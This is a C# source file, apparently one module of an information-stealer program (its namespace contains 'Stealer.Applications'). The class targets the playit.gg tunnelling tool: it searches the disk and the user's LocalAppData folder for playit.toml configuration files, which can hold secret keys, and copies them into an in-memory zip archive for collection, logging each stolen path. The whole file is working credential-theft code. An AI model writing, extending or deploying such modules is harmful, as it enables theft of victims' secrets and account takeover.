using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.General;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class PlayIt : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "PlayIt";
            Parallel.ForEach(ProcessWindows.FindFile("playit.toml"), delegate (string toml)
            {
                string text3 = "PlayIt\\playit" + RandomStrings.GenerateHashTag() + ".toml";
                zip.AddFile(text3, File.ReadAllBytes(toml));
                counterApplications.Files.Add(toml + " => " + text3);
            });
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "playit_gg", "playit.toml");
            if (File.Exists(text))
            {
                string text2 = "PlayIt\\playit.toml";
                zip.AddFile(text2, File.ReadAllBytes(text));
                counterApplications.Files.Add(text + " => " + text2);
            }
            if (counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
